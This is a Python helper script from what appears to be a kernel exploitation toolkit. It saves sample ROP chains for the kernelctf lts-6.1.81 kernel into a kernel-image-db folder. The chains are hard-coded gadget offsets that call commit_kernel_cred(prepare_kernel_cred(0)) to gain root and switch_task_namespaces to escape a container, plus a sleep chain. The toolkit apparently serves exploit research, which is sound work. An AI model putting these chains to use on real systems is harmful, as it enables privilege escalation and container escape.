"""Static sample writer for kernel_rop_generator."""

import argparse
import json
from rop_chain import *
from rop_action_serializer import RopActionSerializer

rop_actions = {
    "kernelctf/lts-6.1.81": {
        # msleep(ARG_time_msec)
        0x01: RopChain(items=[
          RopChainOffset(kernel_offset=0x21f5),
          RopChainArgument(argument_index=0),
          RopChainOffset(kernel_offset=0x227a50)]),

        # commit_kernel_cred(prepare_kernel_cred(0))
        0x02: RopChain(items=[
          RopChainOffset(kernel_offset=0x21f5),
          RopChainConstant(0),
          RopChainOffset(kernel_offset=0x1be800),
          RopChainOffset(kernel_offset=0x17caa80),
          RopChainOffset(kernel_offset=0x1be550)]),

        # switch_task_namespaces(find_task_by_vpid(1), init_nsproxy)
        0x03: RopChain(items=[
          RopChainOffset(kernel_offset=0x21f5),
          RopChainConstant(1),
          RopChainOffset(kernel_offset=0x1b4f20),
          RopChainOffset(kernel_offset=0x17caa80),
          RopChainOffset(kernel_offset=0x30cd),
          RopChainOffset(kernel_offset=0x2876880),
          RopChainOffset(kernel_offset=0x1bc9b0)]),
    }
}

if __name__ == "__main__":
  parser = argparse.ArgumentParser(
      description="Saves sample ROP Action chains into kernel-image-db"
  )
  parser.add_argument("kernel_image_db_path", help="Folder of the kernel-image-db tool")
  args = parser.parse_args()
  for (release_name, release_ras) in rop_actions.items():
    dst_fn = f"{args.kernel_image_db_path}/releases/{release_name}/rop_actions.json"
    with open(dst_fn, "wt") as f:
      f.write(RopActionSerializer.serialize(release_ras))
